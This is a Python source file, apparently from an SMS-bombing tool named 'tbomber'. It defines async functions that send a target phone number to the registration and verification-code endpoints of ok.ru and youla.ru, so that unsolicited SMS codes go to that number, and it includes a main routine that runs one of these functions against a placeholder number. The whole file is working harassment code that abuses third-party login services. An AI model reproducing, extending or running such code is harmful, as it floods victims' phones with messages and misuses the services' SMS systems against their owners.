import asyncio

from httpx import AsyncClient, Response
from typing import Optional, Callable, Any, Awaitable
from tbomber.utils import *


def sender(
    timeout: Optional[int] = None,
    success_resp: Optional[str] = None,
    success_code: Optional[int] = 200,
):
    def wrapper(func: Callable[[AsyncClient, PhoneNumber], Awaitable[Response]]):
        async def sender_func(
            client: AsyncClient, phone_number: PhoneNumber
        ) -> Response:
            print(func.__name__)
            resp = await func(client, phone_number)
            print(resp.status_code, resp.url)
            print(resp.text)
            return resp

        return sender_func

    return wrapper


@sender()
async def ok_ru(client, phone_number):
    return await client.post(
        "https://ok.ru/dk",
        params={
            "cmd": "AnonymRegistrationEnterPhone",
            "st.cmd": "anonymRegistrationEnterPhone",
        },
        data={"st.r.phone": phone_number.with_plus()},
    )


@sender()
async def youla_ru(client, phone_number):
    return await client.post(
        "https://youla.ru/web-api/auth/request_code", data={"phone": phone_number}
    )


async def main():
    async with AsyncClient() as client:
        phone_number = PhoneNumber("+79999999999")
        print(phone_number)
        resp = await youla_ru(client, phone_number)
        print(resp.status_code)


if __name__ == "__main__":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
